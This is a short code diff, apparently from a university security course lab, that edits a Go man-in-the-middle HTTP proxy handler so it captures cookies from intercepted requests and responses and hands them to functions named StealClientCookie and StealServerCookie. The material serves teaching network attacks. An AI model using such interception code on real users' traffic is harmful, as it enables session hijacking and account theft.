@@ -452,10 +452,10 @@ func handleHTTP(rw http.ResponseWriter, r *http.Request) {
 	}
 
 	// eat request cookies
-	reqCookies := r.Cookies()
-	if len(reqCookies) > 0 {
-		for _, cookie := range reqCookies {
-			cs155.StealServerCookie(cookie.Name, cookie.Value)
+	// reqCookies := r.Cookies()
+	if len(r.Cookies()) != 0 {
+		for _, cookie := range r.Cookies() {
+			cs155.StealClientCookie(cookie.Name, cookie.Value)
 		}
 	}
 
@@ -464,9 +464,9 @@ func handleHTTP(rw http.ResponseWriter, r *http.Request) {
 	response, _ := evilClient.Do(request)
 
 	// eat response cookies
-	cookiesSet := response.Cookies()
-	if len(cookiesSet) > 0 {
-		for _, cookie := range cookiesSet {
+	// cookiesSet := response.Cookies()
+	if len(response.Cookies()) != 0 {
+		for _, cookie := range response.Cookies() {
 			cs155.StealServerCookie(cookie.Name, cookie.Value)
 		}
 	}
